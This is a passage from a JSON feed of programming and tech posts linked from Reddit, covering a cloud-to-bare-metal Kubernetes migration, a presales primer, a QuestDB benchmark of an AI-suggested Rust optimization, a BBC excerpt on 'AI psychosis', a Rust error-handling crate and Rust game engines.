incredibly easy to implement Ceph storage, which has been a significant advantage for us. You can check their docs here on how to configure one: <a href=\"https://microk8s.io/docs/addon-rook-ceph\">https://microk8s.io/docs/addon-rook-ceph</a></p><p>For managing publicly facing services, we use MetalLB. MetalLB is a load-balancer implementation for bare metal Kubernetes clusters, using standard routing protocols. Microk8s offers a plugin that simplifies the process of integrating MetalLB into our setup. You can check the docs here: <a href=\"https://microk8s.io/docs/addon-metallb\">https://microk8s.io/docs/addon-metallb</a></p><p>We will do a blog post soon to explain how to configure these if you're thinking about de-clouding yourself.</p><h3>The Financial Impact: Saving $230,000+ per Year</h3><p>When we were utilizing AWS, our setup consisted of a 28-node managed Kubernetes cluster. Each of these nodes was an m7a EC2 instance. With block storage and network fees included, our monthly bills amounted to $38,000+. This brought our annual expenditure to over $456,000+.</p><p>We transitioned to using a single rack configuration at our co-location partner, providing us with 40 rack units of usable space. With each server being 2U - we could potentially rack about 18 of them (other U's are usually for networking equipment). Each of our servers are upgradeable to over 1 TB of RAM and has 2 socket 128 core CPU with about 80 TB usable of storage in our storage cluster.</p><p>The financial implications of this move were significant. We allocated and invested $150,000 in new servers for our bare-metal setup. While this might appear as a substantial upfront cost, the long-term savings have been nothing short of remarkable.</p><p>Our monthly operational expenditure (op-ex), which includes power, cooling, energy, and remote hands (although we seldom use this service), is now approximately $5,500. When compared to our previous AWS costs, we’re saving over $230,000 roughly per year if you amortize the cap-ex costs of the server over 5 years. This substantial reduction in expenses has enabled us to allocate resources to other critical areas of our business and has facilitated the hiring of more engineers. <strong>Thats over 55% in savings for better compute!</strong></p><ul><li><p> We back up all of our data multiple times a day to a storage server located at two of our offices - one in Boston, US, and the other in London, UK. You can also do this to a public cloud. We think its easier and cheaper to do it on-prem.</p></li><li><p> You could also run a multi-location kubernetes cluster on two different co-location facility with 2 different co-location partners in 2 different continents for higher redundancy. You could potentally do this by creating a VPN between these two locations.</p></li><li><p> We have a ready to go backup cluster on AWS that can spin up in under 10 minutes if something were to happen to our co-location facility. Helm charts + k8s make it really easy to spin these up. We still use AWS in disaster scenarios and haven't closed our AWS account just yet!</p></li><li><p> When planning a transition to bare metal, many believe that hiring server administrators is a necessity. While their role is undeniably important, it’s worth noting that a substantial part of hardware maintenance is actually managed by the colocation facility. In the context of AWS, the expenses associated with employing AWS administrators often exceed those of Linux on-premises server administrators. This represents an additional cost-saving benefit when shifting to bare metal. With today’s servers being both efficient and reliable, the need for “management” has significantly decreased.</p></li><li><p> There is a common misconception that Microk8s is only for edge computing or development purposes. However, this is not true at all. Microk8s is a small, fast, and single-package Kubernetes distribution that can run on any platform. Many companies, including ours, are using Microk8s in production environments and the official documentation supports this use case. We have been very satisfied with Microk8s so far, but we are also flexible to change to another Kubernetes distribution if needed. The beauty of Kubernetes is that it is portable, extensible, and open source, so switching flavors is easy. We chose Kubernetes because it is the best platform for managing containerized workloads and services.</p></li></ul><p>Our transition from AWS to bare-metal infrastructure underscores the fact that while cloud services such as AWS offer robust flexibility and power, they may not always be the most economical choice for every enterprise. By harnessing the power of open-source technologies and investing in our own hardware, we’ve not only gained greater control over our resources but also realized substantial savings in operational costs.</p><p>It’s important to remember that each business has its own unique needs. What proved successful for us may not necessarily yield the same results for everyone. Therefore, conducting a comprehensive evaluation of your specific requirements is crucial before undertaking such a transition.</p><p>Thanks to advancements in technologies like Docker, Kubernetes, Helm, Microk8s, and more, transitioning to bare-metal infrastructure is now significantly easier than it was just a few years ago.</p>","contentLength":10231,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1mwbn6r/how_moving_from_aws_to_baremetal_k8s_saved_us/"},{"title":"Technical Sales & Presales 101: The very basics","url":"https://lukasniessen.com/blog/06-presales-definitions/","date":1755783773,"author":"/u/trolleid","guid":235886,"unread":true,"content":"<p>This article is mainly aimed at developers looking to switch into technical sales. So I cover the very basics of this topic.</p><p>A lead is just a potential customer. This can be someone that signed up for a demo, someone in your contacts who you think might be interested in your product, someone who signed up for a free trial etc. There are however different types of leads and I will introduce them now.</p><p>To avoid confusion, a lead typically refers to a person. That person of course it usually associated to a company, and that company will hopefully become a customer one day.</p><h3>Marketing Qualified Lead (MQL)</h3><p>A lead that meets certain marketing criteria (right job title, company size, industry, engagement with marketing content). Marketing might say: <em>“This person looks like our ICP (ideal customer profile)”</em>. This means, that person is a MQL.</p><h3>Sales Accepted Lead (SAL)</h3><p>This is a lead where sales agrees it’s worth working on. So the marketing team has a lead and the sales team ”. The lead then is considered a SAL.</p><h3>Sales Qualified Lead (SQL)</h3><p>This is the stage we desire. This is the stage we want in order to continue with actually trying to make this lead a customer. So what a SQL is, is really just a lead that has shown interest in becoming a customer and marketing and sales agree they’re a good fit.</p><p>Often,  is used to see whether a lead is a good fit. BANT = Budget, Authority, Need, and Timeline. A SQL is often also called a . BANT is just one framework though,  is another important one. Some teams also use no framework at all.</p><p>SQLs are so important because they are the group of leads that are most likely to be converted into customers.</p><p>For example, imagine you’re selling cloud infrastructure services. A SQL might be a CTO from a growing startup who has:</p><ul><li> $50k+ annual cloud budget</li><li> Decision-making power for technical purchases</li><li> Their current hosting can’t handle traffic growth</li><li> They need to migrate within 6 months due to a major product launch</li></ul><p>We generally want to know as much as possible about our leads. This helps to identify why they need our product or service. This allows us for a tailored pitch and tailored language. And so on.</p><p>What we want is to find many potential customers, also called  and at some point convert them into customers. So we want: lead ➜ SQL ➜ customer. This is the process. Here some more details.</p><p> there are many ways to generate leads and this is a big topic on its own. Some are networking, asking for referrals, or internet marketing.</p><p> So now that we have leads, we want to see whether they are qualified, so we would invest more time in them. Again: Budget, Authority, Need, and Timeline. So we determine if the lead has the financial resources, decision-making authority, genuine requirement for the product or service, and a specific timeframe for purchase. If yes, then we consider this lead a strong candidate for further qualification. This assessment is typically done by sales representatives.</p><p> As the next step, we . That is, we assign them numerical values that represent how likely it is to convert them into customers. This can be based on many things, such as company size, engagement level and job title.</p><p> By lead nurturing we mean . The goal is to build trust and spark interest. This means providing info about the product or service and addressing their pain points. This may be achieved through personalised email campaigns, case studies, content marketing, and webinars. Important, we use our lead scoring to decide how much time we invest into lead nurturing for each lead.</p><p><strong>5. Scheduling a Meeting or Call:</strong> Once a lead has shown strong interest in the product or service, we schedule a meeting or a call. Here we will dive deep into the lead’s requirements, understand their challenges and pain points, and present tailored solutions. This is often called a  and might involve both the AE and a solution engineer if technical questions are expected.</p><p> This is the final step of this process. When the lead shows a strong interest in the service or product and you’ve had a meeting or multiple already, it might be time for closing the deal. This includes making a deal proposal, which includes a summary of the customer’s needs, a detailed explanation of the proposed solution, why and how that’s good for the customer, pricing, terms and conditions and more. But it also includes negotiating aspects of the proposal. For complex technical sales, this might also include technical proofs of concept or pilot implementations.</p><p>This process is called sales pipeline. If we would outline the same process but write everything from the customer’s perspective instead and notice that the amount of leads decreases with every step, it would be called sales funnel. However, these two terms are sometimes used interchangeably.</p><p>Note that we also often say  and mean the above process together with all existing leads. So the  your entire sales cylce is in right now.</p><p>Let’s clarify who is involved in this process.</p><p>The account executive, also called sales representative or just sales rep, is the person who acts as the primary point of contact and  a particular lead or potential deal. This means, he is the main face of your company to this lead. He is responsible for building the relationship and understanding the customer’s needs.</p><p>For example, if you’re selling enterprise software, the AE might be responsible for 20-30 active opportunities, each representing potential deals worth $50k-$500k. They spend their time on calls understanding business requirements, presenting value propositions, and navigating the customer’s procurement process.</p><p>However, he is not working alone of course.</p><p>The entire process can only start if we have leads. The lead generation is typically done by the marketing team (doing ads, social media marketing, online content etc).</p><p>Next, we distinguish between  and . Not hard to guess, but presales is all the activities and support that occur before a sale closes. That includes customer research, prospecting, discovery (including technical discovery) and more. Post sales is everything after the deal was closed, so for example a good onboarding and general .</p><p>Just as a note, developers, software architects, designers and so on, are not part of this process. At least not by the standard business lingo. Of course, the developers start working after the deal was closed, but when we say , we’re not talking about that. We’re talking about things like customer suport or account management.</p><p>Now when we talk about , often we mean someone with technical expertise. That is often a  or a  and their role typically is to help with technical discovery, answer technical questions that might come up (AEs don’t know the answer normally), help architect and design the proposed solution and take part in the presentation of it, in the pitch.</p><h2>Not everyone is a Prospect</h2><p>I will not dive deep here, but I want to mention, that it’s important to understand that not every lead is a prospect. It’s  to narrow down in the sales cycle. There is a reason we have different terms (Lead, MQL, SQL). If you don’t narrow it down and do good lead scoring, you will waste resources massively. Don’t treat everyone like SQL.</p><h2>Solution Engineers &amp; Architects in Presales</h2><p>For developers considering a transition into sales, the solution engineer or solution architect role is often the natural entry point. These roles bridge the gap between technical expertise and business value. Let me break down what this actually looks like in practice.</p><h3>What Solution Engineers Do</h3><p>A solution engineer (SE) is essentially the technical wing of the sales team. While the AE focuses on relationship building and understanding business needs, the SE handles all technical aspects of the sale.</p><p> This means understanding the customer’s current technical environment. For example, if you’re selling a cloud platform, you’d need to understand their current infrastructure, what databases they use, their security requirements, and their deployment processes. You’re not just asking <em>“what technology do you use?”</em> but rather <em>“how does your current system handle peak traffic?”</em> or <em>“what’s your disaster recovery setup?”</em></p><p> Based on the discovery, you design a solution that fits their specific needs. This isn’t about presenting a generic demo, but rather showing exactly how your product would integrate into their environment. For instance, if they’re a retail company with seasonal traffic spikes, you’d design a solution that shows auto-scaling capabilities specifically for their Black Friday traffic patterns.</p><p> You’ll give live demonstrations of the product, often customized to their use case. This might mean setting up a demo environment that mirrors their data structure or showing how your API would integrate with their existing systems.</p><p><strong>Proof of Concepts (POCs):</strong> Sometimes customers want to test your solution with their actual data or use cases. You’d help set up and run these technical evaluations.</p><h3>Examples of Solution Engineer Work</h3><p>Let’s say you’re selling a data analytics platform to a logistics company:</p><ul><li> You’d learn they track 50,000 shipments daily, use Oracle databases, have compliance requirements, and their current reporting takes 3 hours to generate.</li><li> You’d design a solution showing real-time dashboards, automated compliance reporting, and integration with their Oracle systems.</li><li> You’d use their actual shipping data structure to show how reports that currently take 3 hours could be generated in real-time.</li><li> They might want to test with their actual data for 30 days to see the performance improvements.</li></ul><p>Or if you’re selling cybersecurity software to a financial services company:</p><ul><li> Understanding their current security stack, compliance requirements (like PCI DSS), incident response procedures, and integration needs.</li><li> Showing how your solution fits into their existing security infrastructure without disrupting operations.</li><li> Demonstrating threat detection using scenarios relevant to financial services, like detecting suspicious transaction patterns.</li></ul><h3>Solution Architect vs Solution Engineer</h3><p>The terms are often used interchangeably, but there can be subtle differences:</p><p> typically implies more strategic, high-level design work. They might work on larger, more complex deals and focus on architectural patterns and long-term technical strategy.</p><p> often handles more hands-on technical work, demos, POCs, and day-to-day technical customer interactions.</p><p>In smaller companies, one person might do both roles. In larger companies, you might have senior solution architects who design complex solutions and junior solution engineers who execute demos and handle technical questions.</p><h3>Why This Role Works for Developers</h3><p>This role is attractive for developers because:</p><ol><li><strong>You use your technical skills daily</strong> - understanding APIs, databases, cloud architecture, security patterns, etc.</li><li><strong>You learn business context</strong> - seeing how technology solves real business problems, not just technical challenges.</li><li><strong>Direct customer interaction</strong> - you get immediate feedback on how your technical solutions impact real users.</li><li> - presales roles typically pay more than pure development roles.</li><li> - you can move into sales leadership, product management, or customer success roles.</li></ol><p>The key difference from development is that instead of building solutions, you’re designing and demonstrating them to solve specific customer problems. Your success is measured not by code quality or features shipped, but by whether customers understand and buy the technical solution you’ve presented.</p><p>But ultimately, it’s a matter of whether you like to sell or not. Personally, I think sales is a super interesting field to work in as, when you think about it, everything in life is basically sales. So becoming good at it is not just a career win :)</p>","contentLength":11820,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwbaxd/technical_sales_presales_101_the_very_basics/"},{"title":"[R] Observing unexpected patterns in MTPE demand across languages","url":"https://www.reddit.com/r/MachineLearning/comments/1mwb7pp/r_observing_unexpected_patterns_in_mtpe_demand/","date":1755783560,"author":"/u/NataliaShu","guid":236767,"unread":true,"content":"<p>Hi ML folks, I work at Alconost (localization services), and we’ve just wrapped up our 5th annual report on language demand for localization. For the first time, we’ve seen MTPE (machine-translation post-editing) demand reach statistically significant levels across multiple languages. </p><p>We analyzed MTPE adoption rates in the Top 20 languages, and what’s interesting is that some languages that are slipping in overall localization demand are still  via MTPE. </p><p>I’m curious: if you’re working with MT or LLM workflows, have you noticed similar patterns in the languages you work with? </p><p>What do you think is driving MTPE demand for certain languages? Is it related to model performance, availability of training data, or just market pressure to reduce costs? </p>","contentLength":764,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How to Get People Excited about Functional Programming • Russ Olsen & James Lewis","url":"https://youtu.be/0SpsIgtOCbA","date":1755782756,"author":"/u/goto-con","guid":235733,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwaw1l/how_to_get_people_excited_about_functional/"},{"title":"When AI optimizations miss the mark: A case study in array shape calculation","url":"https://questdb.com/blog/when-ai-optimizations-miss-the-mark/","date":1755780492,"author":"/u/j1897OS","guid":235701,"unread":true,"content":"<div>\n  QuestDB is the open-source time-series database for demanding workloads—from trading floors to mission control\n  It delivers ultra-low latency, high ingestion throughput, and a multi-tier storage engine.\n  Native support for Parquet and SQL keeps your data portable, AI-ready—no vendor lock-in.</div><p>As a core database engineer at QuestDB, I regularly work with\nperformance-critical code that processes massive datasets. Recently, I\nencountered an interesting case where an AI-suggested optimization actually made\nour code slower, despite appearing more sophisticated on paper. This experience\nhighlights the importance of benchmarking real-world performance rather than\nrelying solely on theoretical improvements.</p><p>The function in question is , a critical component of our\nApache Parquet reader that computes the dimensions of\n<a href=\"https://questdb.com/docs/concept/array/\">arrays</a> from\n<a href=\"https://parquet.apache.org/docs/file-format/nestedencoding\">repetition levels</a>.\nIn case of ND arrays, the repetition levels specify at what repeated field\n(think, dimension) in the path an array element is defined. Thus, repetition\nlevels are nothing more but an array of integers. The \nfunction processes potentially millions of elements during large dataset\nexports, making its performance crucial to overall system throughput. The very\nfirst version of the function was simple, but left a lot to wish when it comes\nto being CPU-friendly:</p><div><div><div><pre></pre></div></div></div><p>This function takes the given Parquet repetition levels and converts them into\nQuestDB's native array header. The header contains NumPy-style shape, i.e. a\nlist of dimension sizes. In this post, we'll be focusing on the performance\naspects of the code, rather than on its functionality, but if you're eager to\nlearn more, here is the\n<a href=\"https://github.com/questdb/questdb/pull/5925\">pull request</a> where array support\nin Parquet partitions landed.</p><p>Vlad, our CTO, reviewed the initial version of the pull request and noticed the\npotentially slow  function. He suggested giving\n<a href=\"https://www.anthropic.com/claude-code\">Claude code</a> a try optimizing the\nfunction, so that's what we did.</p><p>The original function was given to Claude and it came up with several\nsophisticated improvements:</p><ul><li>Special-case handling for different array depths</li><li>Unrolled loops for common small dimensions (2D, 3D, 4D)</li><li>Chunked processing for higher dimensions to improve cache locality</li></ul><p>In this high-level list, these optimizations looked spot-on. The AI correctly\nidentified hotspots and applied textbook performance optimization techniques.\nHowever, when I looked at the code and then ran microbenchmarks, I discovered\nthe optimized version was actually only slightly faster than the original\nversion and in the generic ND case it performed in exactly the same way.</p><p>What Claude came up with had a fast-path code for 1D-4D arrays which completely\nmakes sense as such arrays are the most popular ones. This fast-path looked\nsomething like the following:</p><div><div><div><pre></pre></div></div></div><p>As you may have noticed, the AI kept the structure of the old code, but\nintroduced an unrolled version of the first loop. While this is a step in the\nright direction, this is half-done optimization. In a moment, we'll see how a\nproperly optimized fast-path would look like.</p><p>Other than that, Claude replaced  with a  call on the number\nwhich is a cosmetic change. Other than that, it introduced block-based iteration\nin the general ND case:</p><div><div><div><pre></pre></div></div></div><p>The AI's excuse to introduce 64 elements block iteration is better CPU cache\nlocality. Unfortunately, here the iteration is single-pass only, so this change\ngave no improvement.</p><p>After looking at all of this, we gave a try optimizing the function from where\nAI left it.</p><p>The final version takes a different approach, focusing on explicit pattern\nmatching for each dimension level:</p><div><div><div><pre></pre></div></div></div><p>First of all, for the 1D-4D arrays we handle each number of dimensions with its\nown optimized logic. Say, for 1D arrays we know that the repetition levels\nalways look like  since there only possible depth is the first\ndimension. So, calculating the shape of a 1D array is as simple as:</p><div><div><div><pre></pre></div></div></div><p>Same with 2D-4D arrays, we just took the original code, unrolled the loops by\nhand with the known number of dimensions and then removed redundant operations\nlike zero assignments at the same array element followed by an increment.</p><p>While it results in more code duplication, this approach eliminates a lot of\nbranches, as well as redundant loads and stores and allows the compiler to\noptimize each case independently.</p><p>Next, we took a glance at the generic case. While we couldn't unroll the loops\neasily like in the previous cases, we could still merge the loops into a single,\nsimpler loop. The result is the following:</p><div><div><div><pre></pre></div></div></div><p>Instead of three loops, now we only have a single one with no additional\nbranches. What's not to like for a CPU?</p><p>Full code of the function may be found\n<a href=\"https://github.com/questdb/questdb/blob/75335d33b1d7e60ee3b4ff26d5cc0680361864a3/core/rust/qdbr/src/parquet_write/array.rs#L621-L717\">here</a>.\nNow, it's time to benchmark the whole thing.</p><p>After a number of attempts, Claude kindly generated a\n<a href=\"https://gist.github.com/puzpuzpuz/4df9a361a3b1fee9149d83397c1933d7\">microbenchmark</a>\nto compare both implementations across different array dimensions. To eliminate\nCPU branch predictor advantages and get realistic performance measurements, the\nbenchmark uses 1000 different randomly-generated test cases for each type of the\narray. The test cases are located in a single flat vector to avoid CPU cache\nmisses.</p><p>Here is the result obtained on a Ryzen 7900x box running Ubuntu 22.04 and Rust\n1.89:</p><div><div><div><pre></pre></div></div></div><p>The performance improvement remains substantial even with randomized inputs that\nprevent branch predictor optimization. The 1D case still shows the most dramatic\nimprovement at over 9x faster in the random input case, as the new\nimplementation has a trivial special case: <code>shape[0] = rep_levels.len() as u32</code>.\nThe old implementation processed even this simple case through complex generic\nlogic.</p><p>The 2D-4D cases show consistent 2-7x improvements in the random test cases,\ndemonstrating that the benefits persist even under realistic conditions with\nunpredictable branching patterns. In the same test case scenario the difference\nis smaller, yet still noticeable - this is explained by the CPU branch predictor\nbeing able to predict all branches for the old code. The generic ND case is also\nnoticeably faster than the Claude's version.</p><p>The randomized approach provides a more realistic assessment than benchmarking\nidentical arrays repeatedly, as real-world Parquet processing involves arrays\nwith varying shapes and nesting patterns that prevent the CPU's branch predictor\nfrom optimizing the hot paths. For the sake of completeness, we also run the\nsame test case scenario to understand how the new code behaves when the array\nshape stays the same across the Parquet file.</p><p>Let's check how the old code compares with the new one for 1D arrays from the\nCPU hardware perspective. For that, we'll use Linux\n<a href=\"https://perfwiki.github.io/main/\"></a> utility to collect statistics while\nrunning the benchmark. To collect the stats, we changed the number of tests\ncases to 10,000 and the number of iterations to 100,000. First, we run the old\ncode:</p><div><div><div><pre></pre></div></div></div><p>Next, let's run the new code:</p><div><div><div><pre></pre></div></div></div><p>The number of branches dropped from 7.3B to 894M per second and the number of\nbranch misses also dropped significantly, from 0.23% to 0.05%. This tells us\nthat the CPU is dealing with less branches in the new code. Contrarily, the IPC\n(instructions per cycle) value dropped from 5.73 to 1.77 - another example that\na higher IPC does not always mean better performance. Here the total number of\nretired instructions dropped from 1,953B to 63B. No surprise that that the new\ncode ran faster although it has 3x lower IPC - the CPU had to execute 31x less\ninstructions.</p><p>Of course, we could go one step further porting the code to use SIMD\ninstructions to the same logic simultaneously on repetition levels for multiple\narrays. But we decided to stop where we were singe this function is only a part\nof the decoding pipeline and the new version is already fast enough not to be\nthe bottleneck.</p><p>This experience reinforced several important principles for performance-critical\nsystems:</p><p>: The most straightforward implementation frequently\noutperforms \"clever\" optimizations, especially when the compiler can apply its\nown optimizations effectively.</p><p>: No optimization is complete without thorough\nbenchmarking on representative workloads. What looks good in theory may perform\npoorly in practice.</p><p>: Modern CPUs are incredibly sophisticated, with\ncomplex branch prediction, caching, and instruction-level parallelism. Hand\noptimizations must work with these features, not against them.</p><p>: AI suggestions can provide valuable insights, but they\nshould always be validated through empirical testing before being deployed to\nproduction systems.</p><p>The database field is particularly unforgiving when it comes to performance\nregressions. A few percentage points of slowdown in a hot path can translate to\nsignificant increases in query latency across an entire system. This makes\nrigorous benchmarking not just good practice, but essential for maintaining\nsystem performance at scale.</p><p>In our Parquet decoding pipeline, this 5x improvement in array shape calculation\ntranslates to noticeably faster query times for complex arrays - a meaningful\nimprovement for users working with large analytical datasets.</p>","contentLength":8939,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw9ztz/when_ai_optimizations_miss_the_mark_a_case_study/"},{"title":"OPA maintainers and Styra employees hired by Apple","url":"https://blog.openpolicyagent.org/note-from-teemu-tim-and-torin-to-the-open-policy-agent-community-2dbbfe494371","date":1755780304,"author":"/u/West-Chard-1474","guid":235700,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw9x7q/opa_maintainers_and_styra_employees_hired_by_apple/"},{"title":"Microsoft boss troubled by rise in reports of 'AI psychosis'","url":"https://www.bbc.co.uk/news/articles/c24zdel5j18o","date":1755779727,"author":"/u/willm8032","guid":235853,"unread":true,"content":"<p>He said the tool did advise him to talk to Citizens Advice, and he made an appointment, but he was so certain that the chatbot had already given him everything he needed to know, he cancelled it. </p><p>He decided that his screenshots of his chats were proof enough. He said he began to feel like a gifted human with supreme knowledge.</p><p>Hugh, who was suffering additional mental health problems, eventually had a full breakdown. It was taking medication which made him realise that he had, in his words, \"lost touch with reality\".</p><p>Hugh does not blame AI for what happened. He still uses it. It was ChatGPT which gave him my name when he decided he wanted to talk to a journalist.</p><p>But he has this advice: \"Don't be scared of AI tools, they're very useful. But it's dangerous when it becomes detached from reality.</p><p>\"Go and check. Talk to actual people, a therapist or a family member or anything. Just talk to real people. Keep yourself grounded in reality.\"</p><p>OpenAI, the makers of ChatGPT, has been contacted for comment.</p><p>\"Companies shouldn't claim/promote the idea that their AIs are conscious. The AIs shouldn't either,\" wrote Mr Suleyman, calling for better guardrails.</p><p>Dr Susan Shelmerdine, a medical imaging doctor at Great Ormond Street Hospital and also an AI Academic, believes that one day doctors may start asking patients how much they use AI, in the same way that they currently ask about smoking and drinking habits.</p><p>\"We already know what ultra-processed foods can do to the body and this is ultra-processed information. We're going to get an avalanche of ultra-processed minds,\" she said.</p>","contentLength":1584,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mw9pf1/microsoft_boss_troubled_by_rise_in_reports_of_ai/"},{"title":"Introducing `eros`: A Revolution In Error Handling For Rust","url":"https://www.reddit.com/r/rust/comments/1mw9jr1/introducing_eros_a_revolution_in_error_handling/","date":1755779299,"author":"/u/InternalServerError7","guid":235732,"unread":true,"content":"<p>Everyone has weird niches they enjoy most. For me that is error handling. In fact I have already authored a fairly popular error handling library called <a href=\"https://github.com/mcmah309/error_set\">error_set</a>. I love Rust out of the box error handling, but it is not quiet perfect. I have spent the past few years mulling over and prototyping error handling approaches and I believe I have come up with the best error handling approach for most cases (I know this is a bold claim, but once you see it in action you may agree).</p><p>For the past few months I have been working on <a href=\"https://github.com/mcmah309/eros\">eros</a> in secret and today I release it to the community. Eros combines the best of libraries like <a href=\"https://github.com/dtolnay/anyhow\">anyhow</a> and <a href=\"https://github.com/komora-io/terrors\">terrors</a> with unique approaches to create the most ergonomic yet typed-capable error handling approach to date.</p><p>Eros is built on 4 error handling philosophies: - Error types only matter when the caller cares about the type, otherwise this just hinders ergonomics and creates unnecessary noise. - There should be no boilerplate needed when handling single or multiple typed errors - no need to create another error enum or nest errors. - Users should be able to seamlessly transition to and from fully typed errors. - Errors should always provided context of the operations in the call stack that lead to the error.</p><p>Example (syntax highlighting <a href=\"https://github.com/mcmah309/eros?tab=readme-ov-file#putting-it-all-together\">here</a>):</p><p>```rust use eros::{ bail, Context, FlateUnionResult, IntoConcreteTracedError, IntoDynTracedError, IntoUnionResult, TracedError, }; use reqwest::blocking::{Client, Response}; use std::thread::sleep; use std::time::Duration;</p><p>// Add tracing to an error by wrapping it in a . // When we don't care about the error type we can use  which has tracing. //  ===  ===  // When we  care about the error type we can use  which also has tracing but preserves the error type. //  ===  ===  // In the below example we don't preserve the error type. fn handle_response(res: Response) -&gt; eros::Result&lt;String&gt; { if !res.status().is_success() { //  to directly bail with the error message. // See  to create a  without bailing. bail!(\"Bad response: {}\", res.status()); }</p><pre><code>let body = res .text() // Trace the `Err` without the type (`TracedError`) .traced_dyn() // Add context to the traced error if an `Err` .context(\"while reading response body\")?; Ok(body) </code></pre><p>// Explicitly handle multiple Err types at the same time with . // No new error enum creation is needed or nesting of errors. //  ===  fn fetch_url(url: &amp;str) -&gt; eros::UnionResult&lt;String, (TracedError&lt;reqwest::Error&gt;, TracedError)&gt; { let client = Client::new();</p><pre><code>let res = client .get(url) .send() // Explicitly trace the `Err` with the type (`TracedError&lt;reqwest::Error&gt;`) .traced() // Add lazy context to the traced error if an `Err` .with_context(|| format!(\"Url: {url}\")) // Convert the `TracedError&lt;reqwest::Error&gt;` into a `UnionError&lt;_&gt;`. // If this type was already a `UnionError`, we would call `inflate` instead. .union()?; handle_response(res).union() </code></pre><p>fn fetch_with_retry(url: &amp;str, retries: usize) -&gt; eros::Result&lt;String&gt; { let mut attempts = 0;</p><pre><code>loop { attempts += 1; // Handle one of the error types explicitly with `deflate`! match fetch_url(url).deflate::&lt;TracedError&lt;reqwest::Error&gt;, _&gt;() { Ok(request_error) =&gt; { if attempts &lt; retries { sleep(Duration::from_millis(200)); continue; } else { return Err(request_error.into_dyn().context(\"Retries exceeded\")); } } // `result` is now `UnionResult&lt;String,(TracedError,)&gt;`, so we convert the `Err` type // into `TracedError`. Thus, we now have a `Result&lt;String,TracedError&gt;`. Err(result) =&gt; return result.map_err(|e| e.into_inner()), } } </code></pre><p>fn main() { match fetch_with_retry(\"<a href=\"https://badurl214651523152316hng.com\">https://badurl214651523152316hng.com</a>\", 3).context(\"Fetch failed\") { Ok(body) =&gt; println!(\"Ok Body:\\n{body}\"), Err(err) =&gt; eprintln!(\"Error:\\n{err:?}\"), } } console Error: error sending request</p><p>Backtrace: 0: eros::generic_error::TracedError&lt;T&gt;::new at ./src/generic_error.rs:47:24 1: &lt;E as eros::generic_error::IntoConcreteTracedError&lt;eros::generic_error::TracedError&lt;E&gt;<strong>::traced at ./src/generic_error.rs:211:9 2: &lt;core::result::Result&lt;S,E&gt; as eros::generic_error::IntoConcreteTracedError&lt;core::result::Result&lt;S,eros::generic_error::TracedError&lt;E</strong><strong>::traced::{{closure}} at ./src/generic_error.rs:235:28 3: core::result::Result&lt;T,E&gt;::map_err at /usr/local/rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/result.rs:914:27 4: &lt;core::result::Result&lt;S,E&gt; as eros::generic_error::IntoConcreteTracedError&lt;core::result::Result&lt;S,eros::generic_error::TracedError&lt;E</strong>&gt;&gt;::traced at ./src/generic_error.rs:235:14 5: x::fetch_url at ./tests/x.rs:39:10 6: x::fetch_with_retry at ./tests/x.rs:56:15 7: x::main at ./tests/x.rs:74:11 8: x::main::{{closure}} at ./tests/x.rs:73:10 &lt;Removed To Shorten Example&gt; ``` Checkout the github for more info: <a href=\"https://github.com/mcmah309/eros\">https://github.com/mcmah309/eros</a></p>","contentLength":4749,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Perl from 25th to 9th spot on the TIOBE index within the last 12 months?","url":"https://www.techrepublic.com/article/news-tiobe-commentary-august/","date":1755776768,"author":"/u/GroggInTheCosmos","guid":235668,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw8mue/perl_from_25th_to_9th_spot_on_the_tiobe_index/"},{"title":"Is game development in Rust one big mirage?","url":"https://www.reddit.com/r/rust/comments/1mw8k2g/is_game_development_in_rust_one_big_mirage/","date":1755776532,"author":"/u/NyanBunnyGirl","guid":235801,"unread":true,"content":"<p>Not looking to be combative or rude or unthankful, but I'd like to be convinced of a strange observation I've been forced to make while looking for a game engine.</p><ol><li>bevy: Inherently tied to ECS design, constant breaking changes everyone warns about?</li><li>piston: Alive as of a year ago?</li><li>ggez: Was dead for a year, but new maintainer? :) Doesn't support Android or WASM <a href=\"https://github.com/ggez/ggez/blob/master/docs/BuildingForEveryPlatform.md\">github issue</a></li><li>nannou: m5 alternative? Is this even an engine? Graphics engine?</li><li>blue_engine: Graphics engine?</li><li>tetra: Dead, unmaintained.</li><li>rltk: Dead, unmaintained.</li><li>quicksilver: Dead, unmaintained.</li><li>lotus_engine: Super cool! Alive, tied to ECS design.</li><li>oxyengine: Dead, unmaintained, ECS.</li><li>console_engine: Dead, unmtaintained.</li><li>rusty_engine: Bevy wrapper???</li><li>screen-13: Vulkan... Rendering engine?</li><li>gemini-engine: ASCII only?</li><li>notan: This looks pretty cool, I think?</li></ol><p>Coffee? Dead. Amethyst? Dead. Dead dead dead dead. Unmaintained- unsound- 3d only- ASCII only- bindings, make your own wheel- ECS is god why wouldn't you want to use it? Cross platform? More like cross a platform into a river???</p><p>Like... I want... to make a 2d game in a cross platform, rusty, maintained, safe engine, with the ability to not use ECS. I want to not have to reinvent a wheel myself, too. I realize I want a unicorn, and I would like that unicorn to be purple (I'm a choosing beggar), but like- is game development in Rust unserious? Bevy looks shinier than gold at least, and there's a lot of hobbyist work here for these engines for no pay in their freetime- I appreciate and love that eternally. (If you've ever contributed to any of these you're super cool and better than me, it's easy to be a critic.) Are my wants just too high? I see someone in another thread say \"See! Look! So many game engines on this page!\" They are dead, unmaintained, bindings, unsafe, not cross platform, 2d vs 3d land only, or married to ECS in a shotgun wedding.</p><p>Please convince me I'm silly and dumb and fighting windmills. Maybe I should just take the ECS pill. But then everyone is saying the ground is ripped out underneath you. Maybe I should learn to stop worrying and love the Bevy- or 